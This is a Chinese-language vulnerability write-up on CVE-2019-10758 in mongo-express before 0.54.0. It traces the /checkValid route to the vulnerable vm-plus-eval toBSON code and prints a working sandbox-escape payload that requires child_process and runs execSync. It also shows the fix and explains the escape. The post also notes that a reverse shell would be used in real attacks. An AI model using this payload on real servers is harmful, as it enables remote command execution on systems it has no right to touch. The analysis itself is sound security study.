@@ -1,0 +1,119 @@
+## 起因
+看到 github 上 follow 的师傅们突然纷纷 star 了一个项目，仔细一看是 mongo-express 的 RCE，赶紧来学习一下最新姿势
+2333（项目地址：
+下面是对漏洞的描述：
+> mongo-express before 0.54.0 is vulnerable to Remote Code Execution via
+> endpoints that uses the `toBSON` method. A misuse of the `vm` dependency to
+> perform `exec` commands in a non-safe environment.
+## 环境搭建
+漏洞复现需要准备的环境有：
+  1. MongoDB
+  2. node & npm
+  3. mongo-express 
+    const router = function (config) {
+      // 省略其他无关代码
+      const appRouter = express.Router();
+      appRouter.post('/checkValid', mongoMiddleware, configuredRoutes.checkValid);
+      return appRouter;
+    }
+继续定位 
+    var routes = function (config) {
+      // 省略其他无关代码
+      var exp = {};
+      exp.checkValid = function (req, res) {
+        var doc = req.body.document;
+        try {
+          bson.toBSON(doc);
+        } catch (err) {
+          console.error(err);
+          return res.send('Invalid');
+        }
+        res.send('Valid');
+      };
+      return exp;
+    }
+可以很明显看到这里会从 POST 请求中读取 `document` 并作为参数继续调用
+`bson.toBSON(doc);`，而根据我们之前的分析，漏洞代码有 99% 的可能性位于 `bson.toBSON`
+函数内，所以继续分析源码，
+    var mongodb = require('mongodb');
+    var vm      = require('vm');
+    var json    = require('./json');
+    // 省略一些无关代码
+    //JSON.parse doesn't support BSON data types
+    //Document is evaluated in a vm in order to support BSON data types
+    //Sandbox contains BSON data type functions from node-mongodb-native
+    exports.toBSON = function (string) {
+      var sandbox = exports.getSandbox();
+      string = string.replace(/ISODate\(/g, 'new ISODate(');
+      string = string.replace(/Binary\(("[^"]+"),/g, 'Binary(new Buffer($1, "base64"),');
+      vm.runInNewContext('doc = eval((' + string + '));', sandbox);
+      return sandbox.doc;
+    };
+    // This function as the name suggests attempts to parse
+    // the free form string in to BSON, since the possibilities of failure
+    // are higher, this function uses a try..catch
+    exports.toSafeBSON = function (string) {
+      try {
+        var bsonObject = exports.toBSON(string);
+        return bsonObject;
+      } catch (err) {
+        return null;
+      }
+    };
+重点出现！>>> `vm.runInNewContext('doc = eval((' + string + '));', sandbox);`
+对 nodejs 的沙箱逃逸有所关注的朋友很容易就能注意到这段代码和 vm 沙盒逃逸代码 demo 的惊人相似：
+    const vm = require('vm');
+    vm.runInNewContext('this.constructor.constructor("return process")().exit()');
+在这里，由于用户输入的最终会被拼接上 `eval`，所以很容易就能导致 RCE。可以看到作者的 exploit 就是获得全局上下文后直接导入
+`child_process` 来执行系统命令：
+    this.constructor.constructor("return process")().mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator')
+不过由于这是个没有回显的 RCE，因此在实际漏洞利用的时候可能需要反弹 shell 之类的操作来辅助漏洞的利用。
+### 攻击链回顾
+  1. 路由 `/checkValid` 可以接收用户的输入，并将其作为参数调用存在漏洞的 `bson.toBSON` 函数
+  2. `bson.toBSON` 使用了不安全的 vm 模块来执行用户输入的代码
+  3. 恶意代码在执行时成功沙盒逃逸，任意代码执行
+## 漏洞修复
+查看修复了漏洞的 v0.54.0 版本的源代码， 可以看到作者废弃了之前 vm + eval 的思路，使用了另一个库来实现该功能：
+    const parser = require('mongodb-query-parser');
+    // 省略无关代码
+    exports.toBSON = function (string) {
+      return parser(string);
+    };
+    // This function as the name suggests attempts to parse
+    // the free form string in to BSON, since the possibilities of failure
+    // are higher, this function uses a try..catch
+    exports.toSafeBSON = function (string) {
+      try {
+        var bsonObject = exports.toBSON(string);
+        return bsonObject;
+      } catch (err) {
+        return null;
+      }
+    };
+好吧，既然没有了 vm 那当然没有沙盒逃逸更没有 RCE 了 :(
+## 补充：vm 沙盒逃逸
+写到这里再来补充点 vm 沙盒逃逸的知识，方便加深大家对该漏洞的理解：
+以漏洞代码为例：
+    vm.runInNewContext('doc = eval((' + string + '));', sandbox);
+这段代码等价于：
+    const vm = require('vm');
+    const script = new vm.Script('doc = eval((' + string + '));');
+    const context = vm.createContext(sandbox);
+    script.runInContext(context);
+对象 `sandbox` 就是 vm 中脚本执行时的上下文环境 context，vm 脚本中全局 this 指向的就是该对象。
+然后如果我们的输入是上文所示的 exploit 的话， vm 中的代码大致等价为：
+    // this -> 传入的 sandbox
+    const ObjectConstructor = this.constructor; // 获取 Object 对象构造函数
+    const FunctionConstructor = ObjectConstructor.constructor; // 获取 Function 对象构造函数
+    const myfun = FunctionConstructor('return process'); // 构造一个函数，返回process全局变量
+    const process = myfun(); // 获得全局 process 变量
+    process.mainModule.require("child_process").execSync("/Applications/Calculator.app/Contents/MacOS/Calculator") // 全局变量简直为所欲为
+可以看到 vm 模块不安全的核心问题在于：vm 内脚本的 context 对象是在主程序中定义的，根据 JS 原型链原理，可以轻松获得主程序中的
+Function 对象。然后如果用主程序的 Function
+对象构造一个函数，那么该函数运行时的上下文环境必然位于主程序中，由此获得了主程序的上下文环境，成功沙盒逃逸！
+## 写在最后
+vm 的沙盒逃逸也是个老生常谈的话题了，没想到在 node-express 这种高达 3.5k stars
+的项目中还会出现这种漏洞，只能说，开发人员还需要提高一下自己的安全意识（笑
+## 参考链接
+  * [github: CVE-2019-10758](https://github.com/masahiro331/CVE-2019-10758)
+  * [vm2，安全的沙箱环境](https://segmentfault.com/a/1190000012672620)
